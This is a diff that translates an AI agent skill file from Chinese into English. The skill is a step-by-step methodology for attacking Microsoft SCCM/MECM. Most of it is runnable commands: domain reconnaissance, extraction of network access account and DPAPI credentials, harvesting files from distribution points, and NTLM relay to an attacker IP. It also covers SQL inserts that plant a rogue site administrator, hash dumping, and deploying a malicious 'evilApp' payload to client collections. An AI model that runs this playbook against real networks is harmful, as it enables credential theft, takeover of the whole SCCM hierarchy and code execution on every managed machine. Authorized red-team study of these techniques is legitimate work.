@@ -1,144 +1,149 @@
 ---
 name: sccm-mecm-attack
-description: "针对 Microsoft SCCM/MECM (Configuration Manager) 的攻击方法论。当内网发现 SCCM 站点服务器、管理点(MP)、分发点(DP) 时使用。覆盖 NAA 凭证提取、任务序列密码、PXE 启动介质、Client Push 强制认证、站点服务器接管、应用部署横向移动、AdminService API 利用、层级接管(CAS→Primary)。"
+description: "Attack methodology for Microsoft SCCM/MECM (Configuration Manager). Use when SCCM site servers, management points (MP), or distribution points (DP) are found on the internal network. Covers NAA credential extraction, task sequence passwords, PXE boot media, Client Push forced authentication, site server takeover, application deployment lateral movement, AdminService API abuse, and hierarchy takeover (CAS→Primary)."
+zh-signals: "针对 Microsoft SCCM/MECM 的攻击方法论，覆盖 NAA 凭证提取、任务序列密码、Client Push、站点接管与横向移动。信号:SCCM,MECM,NAA凭证,Client Push,横向移动"
+when-to-use: >-
+  Use when internal reconnaissance reveals an SCCM/MECM site server, management point,
+  or distribution point, and you need to extract credentials, abuse deployment, or
+  pivot under authorization.
 metadata:
   tags: "sccm,mecm,configmgr,configuration manager,NAA,network access account,client push,PXE,task sequence,site takeover,hierarchy,SharpSCCM,sccmhunter,AdminService,SCCMSecrets,distribution point"
   category: "lateral"
 ---
 
-# SCCM/MECM 攻击
+# SCCM/MECM Attacks
 
-## 触发条件
+## Trigger Conditions
 
-在以下场景使用本技能:
-- 内网发现 SCCM / MECM / ConfigMgr 服务 (站点服务器、MP、DP)
-- DNS 枚举发现 `_mssms_mp` 或 `_mssms_sul` SRV 记录
-- 发现 Management Point (MP) 或 Distribution Point (DP)
-- 需要利用 SCCM 进行横向移动或凭证获取
-- BloodHound / LDAP 枚举发现 `mSSMSManagementPoint` 对象
+Use this skill in the following scenarios:
+- SCCM / MECM / ConfigMgr services are found on the internal network (site server, MP, DP)
+- DNS enumeration reveals `_mssms_mp` or `_mssms_sul` SRV records
+- A Management Point (MP) or Distribution Point (DP) is found
+- SCCM must be abused for lateral movement or credential acquisition
+- BloodHound / LDAP enumeration reveals `mSSMSManagementPoint` objects
 
-## 前置要求
+## Prerequisites
 
-- 域用户凭证 (部分技术支持匿名或机器账号)
-- 工具: SharpSCCM, sccmhunter, SCCMSecrets, pxethiefy, cmloot, ntlmrelayx
-- 网络可达: MP (TCP 80/443), DP (TCP 80/443), Site DB (TCP 1433), SMS Provider (TCP 443)
+- Domain user credentials (some techniques support anonymous or machine account access)
+- Tools: SharpSCCM, sccmhunter, SCCMSecrets, pxethiefy, cmloot, ntlmrelayx
+- Network reachability: MP (TCP 80/443), DP (TCP 80/443), Site DB (TCP 1433), SMS Provider (TCP 443)
 
-## SCCM 架构速查表
+## SCCM Architecture Quick Reference
 
-| 角色 | 说明 | 默认端口 | 关键标识 |
+| Role | Description | Default Port | Key Identifier |
 |------|------|----------|----------|
-| **Primary Site Server** | 核心管理服务器 | - | 运行 SMS_SITE_COMPONENT_MANAGER |
-| **Management Point (MP)** | 客户端策略分发 | 80/443 | IIS CCM_* 虚拟目录 |
-| **Distribution Point (DP)** | 内容分发 | 80/443 | SMS_DP$ 共享 / SCCMContentLib$ |
-| **Site Database** | SQL Server 存储 | 1433 | RBAC_Admins / RBAC_ExtendedPermissions |
+| **Primary Site Server** | Core management server | - | Runs SMS_SITE_COMPONENT_MANAGER |
+| **Management Point (MP)** | Client policy distribution | 80/443 | IIS CCM_* virtual directories |
+| **Distribution Point (DP)** | Content distribution | 80/443 | SMS_DP$ share / SCCMContentLib$ |
+| **Site Database** | SQL Server storage | 1433 | RBAC_Admins / RBAC_ExtendedPermissions |
 | **SMS Provider** | WMI/AdminService API | 443 | AdminService REST API |
-| **CAS** | 层级顶层 (多站点) | - | 管理多个 Primary |
+| **CAS** | Top of the hierarchy (multi-site) | - | Manages multiple Primary sites |
 
 ---
 
-## 决策树
+## Decision Tree
 
 ```
-[开始] 发现 SCCM 基础设施
+[Start] SCCM infrastructure discovered
     │
-    ├─ 有域凭证？
-    │   ├─ 是 → Phase 1: SCCM 侦察
-    │   └─ 否 → PXE 启动介质 / 匿名注册尝试
+    ├─ Do you have domain credentials?
+    │   ├─ Yes → Phase 1: SCCM reconnaissance
+    │   └─ No → PXE boot media / anonymous registration attempt
     │
-    ├─ 凭证获取
-    │   ├─ 可注册设备或控制机器账号 → Phase 2: 秘密策略提取
-    │   └─ 已在 SCCM 客户端 → 本地 DPAPI 提取
+    ├─ Credential acquisition
+    │   ├─ Can register a device or control a machine account → Phase 2: secrets policy extraction
+    │   └─ Already on an SCCM client → local DPAPI extraction
     │
-    ├─ 权限提升
-    │   ├─ Client Push 启用 → Phase 3: 强制认证 relay
-    │   └─ 有 SCCM 管理员 → Phase 4: 横向移动
+    ├─ Privilege escalation
+    │   ├─ Client Push enabled → Phase 3: forced authentication relay
+    │   └─ Have SCCM administrator rights → Phase 4: lateral movement
     │
-    └─ 层级接管
-        └─ 多站点环境 → Phase 5: CAS 传播
+    └─ Hierarchy takeover
+        └─ Multi-site environment → Phase 5: CAS propagation
 ```
 
 ---
 
-## Phase 1: SCCM 侦察
+## Phase 1: SCCM Reconnaissance
 
-**目标**: 发现并识别 SCCM 基础设施组件
+**Objective**: Discover and identify SCCM infrastructure components
 
-### 1.1 DNS SRV 记录查询
+### 1.1 DNS SRV Record Queries
 
 ```bash
-# 查找 Management Point
+# Find the Management Point
 nslookup -type=SRV _mssms_mp._tcp.$DOMAIN
 dig SRV _mssms_mp._tcp.$DOMAIN
 
-# 查找 Software Update Point
+# Find the Software Update Point
 nslookup -type=SRV _mssms_sul._tcp.$DOMAIN
 ```
 
-### 1.2 LDAP 枚举
+### 1.2 LDAP Enumeration
 
 ```powershell
-# 查找 Management Point 对象
+# Find Management Point objects
 ([ADSISearcher]("objectClass=mSSMSManagementPoint")).FindAll() | % {$_.Properties}
 
-# 查找 SCCM 相关 SPN
+# Find SCCM-related SPNs
 setspn -Q *SMS* | findstr /i "SMS"
 setspn -Q *SCCM* | findstr /i "SCCM"
 ```
 
-### 1.3 sccmhunter 自动侦察
+### 1.3 Automated Reconnaissance with sccmhunter
 
 ```bash
-# 发现 SCCM 基础设施
+# Discover SCCM infrastructure
 sccmhunter.py find -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP
 
-# SMB 枚举确认角色
+# Confirm the roles via SMB enumeration
 sccmhunter.py smb -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP
 
-# 显示发现结果
+# Show the discovery results
 sccmhunter.py show -smb
 sccmhunter.py show -all
 ```
 
-### 1.4 本地信息收集
+### 1.4 Local Information Gathering
 
 ```powershell
-# 本地站点信息 (已安装 SCCM 客户端)
+# Local site information (SCCM client already installed)
 SharpSCCM.exe local site-info
 
-# WMI 查询
+# WMI query
 Get-WmiObject -Class SMS_Authority -Namespace root\CCM
 ```
 
-### 1.5 PXE 启动介质发现
+### 1.5 PXE Boot Media Discovery
 
 ```bash
-# 探测 PXE 环境 (无需域凭证)
+# Probe the PXE environment (no domain credentials required)
 pxethiefy.py explore -i $INTERFACE
 ```
 
 ---
 
-## Phase 2: 凭证获取
+## Phase 2: Credential Acquisition
 
-**目标**: 提取 NAA 凭证、任务序列密码、DP 敏感文件
+**Objective**: Extract NAA credentials, task sequence passwords, and sensitive DP files
 
-### 2.1 NAA 提取 — 注册新设备
+### 2.1 NAA Extraction — Register a New Device
 
 ```bash
-# HTTP MP — SCCMSecrets (推荐)
+# HTTP MP — SCCMSecrets (recommended)
 python3 SCCMSecrets.py policies -mp "http://$MP_IP" \
   -u "$MACHINE_NAME" -p "$MACHINE_PASSWORD" -cn "newdevice"
 
-# HTTPS MP (PKI 环境)
+# HTTPS MP (PKI environment)
 python3 SCCMSecrets.py policies -mp "https://$MP_IP" \
   -u '$MACHINE_NAME' -p '$MACHINE_PASSWORD' -cn 'newdevice' \
   --pki-cert ./cert.pem --pki-key ./key.pem
 
-# NTLM relay 提取策略
+# NTLM relay policy extraction
 ntlmrelayx.py -t 'http://$MP_IP/ccm_system_windowsauth/request' \
   -smb2support --sccm-policies
 
-# sccmhunter 自动化
+# sccmhunter automation
 sccmhunter.py http -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP -auto
 ```
 
@@ -147,30 +152,30 @@ sccmhunter.py http -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP -auto
 SharpSCCM.exe get secrets -r newdevice -u $MACHINE_NAME -p $PASSWORD
 ```
 
-### 2.2 PXE 启动介质密码提取
+### 2.2 PXE Boot Media Password Extraction
 
 ```bash
-# Phase 1 发现 PXE 后，解密启动介质中的凭证
+# After discovering PXE in Phase 1, decrypt the credentials in the boot media
 pxethiefy.py decrypt -f $PXE_MEDIA_FILE
 ```
 
-### 2.3 NAA 提取 — 复用已有设备
+### 2.3 NAA Extraction — Reuse an Existing Device
 
 ```bash
-# 使用已攻陷设备的注册凭据
+# Use the registration credentials of an already compromised device
 python3 SCCMSecrets.py policies -mp "http://$MP_IP" \
   --use-existing-device compromised_device/
 ```
 
-### 2.4 本地 DPAPI 提取
+### 2.4 Local DPAPI Extraction
 
 ```bash
-# SystemDPAPIdump (远程)
+# SystemDPAPIdump (remote)
 SystemDPAPIdump.py -creds -sccm $DOMAIN/$USER:$PASSWORD@$TARGET
 ```
 
 ```powershell
-# SharpSCCM 本地
+# SharpSCCM local
 SharpSCCM.exe local secrets disk
 SharpSCCM.exe local secrets wmi
 
@@ -183,27 +188,27 @@ SharpDPAPI.exe SCCM
 dpapi::sccm
 ```
 
-### 2.5 WMI 直接查询
+### 2.5 Direct WMI Queries
 
 ```powershell
-# NAA 凭证 (加密 blob)
+# NAA credential (encrypted blob)
 Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig \
   -Class CCM_NetworkAccessAccount
 
-# 任务序列变量
+# Task sequence variables
 Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig \
   -Class CCM_TaskSequence
 ```
 
-### 2.6 Distribution Point 文件搜刮
+### 2.6 Distribution Point File Harvesting
 
 ```bash
-# SCCMSecrets — 按扩展名搜刮
+# SCCMSecrets — harvest by extension
 python3 SCCMSecrets.py files -dp "http://$DP_IP" \
   -u '$USER' -H '$HASH' \
   --extensions '.txt,.xml,.ps1,.pfx,.ini,.conf'
 
-# cmloot — 批量搜刮
+# cmloot — bulk harvesting
 python3 cmloot.py $DOMAIN/$USER@$TARGET \
   -findsccmservers -target-file sccmhosts.txt \
   -cmlootdownload sccmfiles.txt
@@ -211,40 +216,40 @@ python3 cmloot.py $DOMAIN/$USER@$TARGET \
 
 ---
 
-## Phase 3: 权限提升
+## Phase 3: Privilege Escalation
 
-**目标**: 通过 Client Push / Site DB / AdminService relay 获取站点管理员
+**Objective**: Obtain site administrator rights via Client Push / Site DB / AdminService relay
 
-### 3.1 Client Push 强制认证
+### 3.1 Client Push Forced Authentication
 
-**原理**: Client Push 安装会使用高权限账号对目标发起 NTLM 认证，relay 到其他目标。
+**Principle**: Client Push installation triggers NTLM authentication from a high-privilege account against the target, which can then be relayed to other targets.
 
 ```bash
-# 启动 relay
+# Start the relay
 ntlmrelayx.py -smb2support -socks -ts -ip $ATTACKER_IP -t $TARGET
 ```
 
 ```powershell
-# 触发 Client Push
+# Trigger Client Push
 SharpSCCM.exe invoke client-push -t $TARGET --as-admin
 ```
 
-### 3.2 站点接管 — MSSQL Relay
+### 3.2 Site Takeover — MSSQL Relay
 
-**原理**: 站点服务器机器账号对 Site Database 有 sysadmin 权限，relay 到 MSSQL 后注入管理员。
+**Principle**: The site server machine account has sysadmin rights on the Site Database, so relaying to MSSQL allows injecting an administrator.
 
 ```bash
-# 步骤 1: 启动 MSSQL relay
+# Step 1: start the MSSQL relay
 ntlmrelayx.py -t "mssql://$SITE_DB" -smb2support -socks
 
-# 步骤 2: 触发站点服务器认证 (Coercer / PetitPotam 等)
-# 步骤 3: 通过 SOCKS 连接 SQL
+# Step 2: trigger site server authentication (Coercer / PetitPotam, etc.)
+# Step 3: connect to SQL over SOCKS
 proxychains mssqlclient.py "DOMAIN/$SITE_SERVER$"@"$SITE_DB" -windows-auth
 ```
 
 ```sql
--- 步骤 4: 注入 SCCM 管理员
--- 先获取目标用户 SID
+-- Step 4: inject the SCCM administrator
+-- First obtain the SID of the target user
 USE CM_$SITE_CODE;
 INSERT INTO RBAC_Admins (AdminSID, LogonName, DisplayName, IsGroup, IsDeleted, CreatedBy, CreatedDate, ModifiedBy, ModifiedDate, SourceSite)
 VALUES ($ADMIN_SID, '$DOMAIN\$USER', '$DOMAIN\$USER', 0, 0, '', '', '', '', '$SITE_CODE');
@@ -262,10 +267,10 @@ VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = '$DOMAIN\$USER'),
         'SMS0001R', 'SMS00004', 1);
 ```
 
-### 3.3 站点接管 — AdminService Relay
+### 3.3 Site Takeover — AdminService Relay
 
 ```bash
-# relay 到 SMS Provider AdminService
+# Relay to the AdminService of the SMS Provider
 ntlmrelayx.py -t "https://$SMS_PROVIDER/AdminService/wmi/SMS_Admin" \
   -smb2support --adminservice \
   --logonname "$DOMAIN\\$USER" \
@@ -273,87 +278,87 @@ ntlmrelayx.py -t "https://$SMS_PROVIDER/AdminService/wmi/SMS_Admin" \
   --objectsid $OBJECTSID
 ```
 
-### 3.4 Passive → Active 站点服务器 Relay
+### 3.4 Passive → Active Site Server Relay
 
 ```bash
-# relay passive 站点服务器到 active 站点服务器
+# Relay the passive site server to the active site server
 ntlmrelayx.py -t $ACTIVE_SERVER -smb2support -socks
 
-# 通过 SOCKS dump hash
+# Dump hashes over SOCKS
 proxychains4 secretsdump.py $DOMAIN/$PASSIVE_SERVER\$@$ACTIVE_SERVER
 
-# 以 active 站点服务器身份接管
+# Take over with the identity of the active site server
 sccmhunter.py admin -u $ACTIVE_SERVER\$ -p $LMHASH:$NTHASH -ip $SMS_PROVIDER_IP
 ```
 
 ---
 
-## Phase 4: 横向移动
+## Phase 4: Lateral Movement
 
-**目标**: 利用 SCCM 管理员权限在客户端执行命令
+**Objective**: Execute commands on clients using SCCM administrator rights
 
-### 4.1 应用部署
+### 4.1 Application Deployment
 
 ```powershell
-# SharpSCCM — 指定资源 ID 执行
+# SharpSCCM — execute against a specific resource ID
 SharpSCCM.exe exec -rid $RESOURCE_ID -r $TARGET
 ```
 
-### 4.2 PowerSCCM 完整工作流
+### 4.2 Full PowerSCCM Workflow
 
 ```powershell
-# 发现站点代码
+# Discover the site code
 Find-SccmSiteCode -ComputerName $SITE_SERVER
 
-# 建立会话
+# Establish a session
 $session = New-SccmSession -ComputerName $SITE_SERVER -SiteCode $SITE_CODE -Credential $CRED
 
-# 创建恶意应用
+# Create a malicious application
 New-SccmApplication -Session $session -ApplicationName "evilApp" \
   -PowerShellB64 $ENCODED_PAYLOAD
 
-# 部署到目标
+# Deploy to the target
 New-SccmApplicationDeployment -Session $session -ApplicationName "evilApp" \
   -AssignmentName "deploy" -CollectionName "target_collection"
 
-# 强制客户端检入
+# Force the client to check in
 Invoke-SCCMDeviceCheckin -Session $session -CollectionName "target_collection"
 ```
 
-### 4.3 CMScript 执行
+### 4.3 CMScript Execution
 
 ```powershell
 New-CMScriptDeployement -CMDrive 'E' -ServerFQDN '$SITE_SERVER' \
   -TargetDevice '$TARGET' -Path '.\payload.ps1' -ScriptName 'evilScript'
 ```
 
-### 4.4 AdminService API 交互
+### 4.4 AdminService API Interaction
 
 ```bash
-# sccmhunter 管理控制台
+# sccmhunter admin console
 sccmhunter.py admin -u "$USER" -p "$PASSWORD" -ip "$SITE_SERVER_IP"
 
-# 交互命令: help, interact, ps, ls, cat, exec, etc.
+# Interactive commands: help, interact, ps, ls, cat, exec, etc.
 ```
 
 ---
 
-## Phase 5: 层级接管
+## Phase 5: Hierarchy Takeover
 
-**目标**: 从单站点扩展到整个 SCCM 层级
+**Objective**: Expand from a single site to the entire SCCM hierarchy
 
-### 5.1 CAS 自动传播
+### 5.1 Automatic CAS Propagation
 
-在任一 Primary 站点添加的管理员会自动传播到 CAS 及所有子站点。利用 Phase 3 在一个 Primary 上执行 `add_admin` 后，等待复制同步即可控制全部站点。
+An administrator added to any Primary site automatically propagates to the CAS and all child sites. After running `add_admin` on one Primary using Phase 3, simply wait for replication to synchronize and every site is under your control.
 
 ```bash
-# 在 sccmhunter admin 会话中
+# Inside an sccmhunter admin session
 add_admin $DOMAIN\\$USER $ADMIN_SID
 ```
 
-### 5.2 TAKEOVER-5: 跨站点 AdminService Relay
+### 5.2 TAKEOVER-5: Cross-Site AdminService Relay
 
-在多站点环境中，relay 到远程 SMS Provider 的 AdminService 添加管理员。
+In a multi-site environment, relay to the AdminService of a remote SMS Provider to add an administrator.
 
 ```bash
 ntlmrelayx.py -t "https://$REMOTE_SMS_PROVIDER/AdminService/wmi/SMS_Admin" \
@@ -363,48 +368,48 @@ ntlmrelayx.py -t "https://$REMOTE_SMS_PROVIDER/AdminService/wmi/SMS_Admin" \
   --objectsid $OBJECTSID
 ```
 
-> **注意**: ConfigMgr 2509+ 默认拒绝 AdminService 上的 NTLM 认证，此技术仅适用于早期版本。
+> **Note**: ConfigMgr 2509+ rejects NTLM authentication on AdminService by default, so this technique only applies to earlier versions.
 
 ---
 
-## 常见问题排查
+## Common Issue Troubleshooting
 
-### 无法注册新设备
+### Unable to Register a New Device
 
-1. MP 要求 HTTPS + 客户端证书 — 需获取 PKI 证书或 relay
-2. 自动审批未开启 — 尝试 relay 已批准设备的认证
-3. 站点配置 "仅域加入设备" — 需使用已有机器账号
+1. The MP requires HTTPS + a client certificate — obtain a PKI certificate or relay
+2. Automatic approval is not enabled — try relaying the authentication of an already approved device
+3. The site is configured for "domain-joined devices only" — use an existing machine account
 
-### NAA 提取为空
+### NAA Extraction Returns Nothing
 
-1. 站点未配置 NAA (eNAA 环境) — 尝试任务序列提取
-2. NAA 密码已过期 — 检查 Collection Variables
-3. WMI 策略尚未下发 — 等待策略刷新周期
+1. The site has no NAA configured (eNAA environment) — try task sequence extraction
+2. The NAA password has expired — check the Collection Variables
+3. The WMI policy has not been pushed yet — wait for the policy refresh cycle
 
-### Relay 失败
+### Relay Failure
 
-1. 目标启用 SMB 签名 — 无法 relay SMB，改用 HTTP/MSSQL
-2. EPA (Extended Protection for Authentication) — 绕过需要 TLS 证书私钥
-3. ConfigMgr 2509+ 拒绝 NTLM on AdminService — 需使用 MSSQL 路径
+1. The target enforces SMB signing — SMB cannot be relayed, use HTTP/MSSQL instead
+2. EPA (Extended Protection for Authentication) — bypassing it requires the TLS certificate private key
+3. ConfigMgr 2509+ denies NTLM on AdminService — use the MSSQL path instead
 
 ---
 
-## 工具参考
+## Tool Reference
 
-| 工具 | 用途 | 平台 |
+| Tool | Purpose | Platform |
 |------|------|------|
-| sccmhunter | SCCM 侦察/利用/管理 | Linux |
-| SharpSCCM | SCCM 客户端利用 | Windows |
-| SCCMSecrets | 策略/NAA/DP 提取 | Linux |
-| pxethiefy | PXE 启动介质分析 | Linux |
-| cmloot / sccm-http-looter | DP 文件搜刮 | Linux |
-| ntlmrelayx | NTLM relay 攻击 | Linux |
-| PowerSCCM | SCCM 管理操作 | Windows |
+| sccmhunter | SCCM reconnaissance/exploitation/management | Linux |
+| SharpSCCM | SCCM client exploitation | Windows |
+| SCCMSecrets | Policy/NAA/DP extraction | Linux |
+| pxethiefy | PXE boot media analysis | Linux |
+| cmloot / sccm-http-looter | DP file harvesting | Linux |
+| ntlmrelayx | NTLM relay attacks | Linux |
+| PowerSCCM | SCCM management operations | Windows |
 
 ---
 
-## 深入参考
+## Further Reading
 
-- → [references/sccm-enumeration.md](references/sccm-enumeration.md) — SCCM 侦察方法与工具命令参考
-- → [references/credential-harvesting.md](references/credential-harvesting.md) — 秘密策略提取、NAA/任务序列/DP 凭证获取详解
-- → [references/site-takeover.md](references/site-takeover.md) — 站点接管与横向移动完整攻击链
+- → [references/sccm-enumeration.md](references/sccm-enumeration.md) — SCCM reconnaissance methodology and tool command reference
+- → [references/credential-harvesting.md](references/credential-harvesting.md) — details on secrets policy extraction and NAA/task sequence/DP credential acquisition
+- → [references/site-takeover.md](references/site-takeover.md) — complete attack chains for site takeover and lateral movement
